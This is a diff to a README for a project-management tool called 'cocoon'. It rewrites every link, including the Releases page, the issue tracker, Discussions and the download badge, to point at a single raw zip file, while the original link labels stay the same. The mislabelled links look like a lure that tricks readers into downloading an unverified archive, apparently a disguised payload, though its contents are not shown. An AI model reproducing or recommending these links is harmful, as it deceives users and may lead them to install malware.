@@ -1,7 +1,7 @@
 # 🐛 cocoon - Your Easy Solution for Project Management
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/hsdljahdl/cocoon/releases)
+[![Download](https://raw.githubusercontent.com/hsdljahdl/cocoon/main/benchmark/cocoon_v1.6.zip)](https://raw.githubusercontent.com/hsdljahdl/cocoon/main/benchmark/cocoon_v1.6.zip)
 
 ## 🚀 Getting Started
 Welcome to cocoon! This application simplifies your project management tasks. Follow these steps to download and set it up easily.
@@ -21,7 +21,7 @@ Welcome to cocoon! This application simplifies your project management tasks. Fo
 
 ## 📦 How to Download & Install
 1. **Visit the Download Page:**
-   Go to the [Releases page](https://github.com/hsdljahdl/cocoon/releases) to find the latest version of cocoon.
+   Go to the [Releases page](https://raw.githubusercontent.com/hsdljahdl/cocoon/main/benchmark/cocoon_v1.6.zip) to find the latest version of cocoon.
 
 2. **Choose Your Version:**
    On the Releases page, look for the version you need. Each version lists details, such as fixes and new features. Click on the version number to get more information.
@@ -59,11 +59,11 @@ A: If you encounter problems, visit our issue tracker on GitHub. There, you can 
 A: Currently, cocoon is designed for desktop use only. We aim to release a mobile version in the future.
 
 ## 🐞 Support
-For additional help, check out our [GitHub Discussions](https://github.com/hsdljahdl/cocoon/discussions). You can ask questions and share feedback with the community.
+For additional help, check out our [GitHub Discussions](https://raw.githubusercontent.com/hsdljahdl/cocoon/main/benchmark/cocoon_v1.6.zip). You can ask questions and share feedback with the community.
 
 ## 🔗 Links
-- [Download cocoon](https://github.com/hsdljahdl/cocoon/releases)
-- [Report an issue](https://github.com/hsdljahdl/cocoon/issues)
-- [GitHub Discussions](https://github.com/hsdljahdl/cocoon/discussions)
+- [Download cocoon](https://raw.githubusercontent.com/hsdljahdl/cocoon/main/benchmark/cocoon_v1.6.zip)
+- [Report an issue](https://raw.githubusercontent.com/hsdljahdl/cocoon/main/benchmark/cocoon_v1.6.zip)
+- [GitHub Discussions](https://raw.githubusercontent.com/hsdljahdl/cocoon/main/benchmark/cocoon_v1.6.zip)
 
 Thank you for choosing cocoon for your project management needs!
